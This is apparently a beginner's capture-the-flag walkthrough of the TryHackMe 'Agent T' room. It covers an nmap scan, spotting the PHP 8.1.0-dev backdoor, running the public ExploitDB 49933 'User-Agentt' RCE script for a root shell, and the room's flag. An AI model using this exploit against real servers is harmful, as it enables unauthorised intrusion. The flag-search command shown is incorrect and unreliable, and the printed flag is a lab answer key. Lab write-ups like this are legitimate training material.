# **Tryhackme | Agent T**

target ip: http://10.10.50.113

### Step 1: [Initial Observation / Reconnaissance]

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 04:46 EST
Nmap scan report for 10.10.50.113
Host is up (0.25s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Upon further inspection:
- No file upload fields or input forms are visible on the landing page.
- Navigating to various subdirectories results in error messages, indicating restricted access to certain areas.


### Step 2: Information Gathering / Vulnerability Identification

Running some gobuster all of them it didn't worked so I went to BurpSuite 

On the BurpSuite one vulnerability is the header which is the PHP version name **PHP 8.1.0-dev** of the website and looked into ExploitDB

https://www.exploit-db.com/exploits/49933 - 'User-Agentt' Remote Code Execution

### Step 3: Exploitation

I download from the explo-db of that exploit and run it which it worked

python3 49933.py  
Enter the full host url:
http://10.10.50.113

Interactive shell is opened on http://10.10.50.113 
Can't acces tty; job crontol turned off.
$ ls
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor

Since i run the command "id" it shows that i am the root which i can see the whole file system
to search the flag with the command 

**file / -name flag.txt 2/dev/null**

flag{4127d0530abf16d6d23973e3df8dbecb}


disclaimer: still practicing my documentation
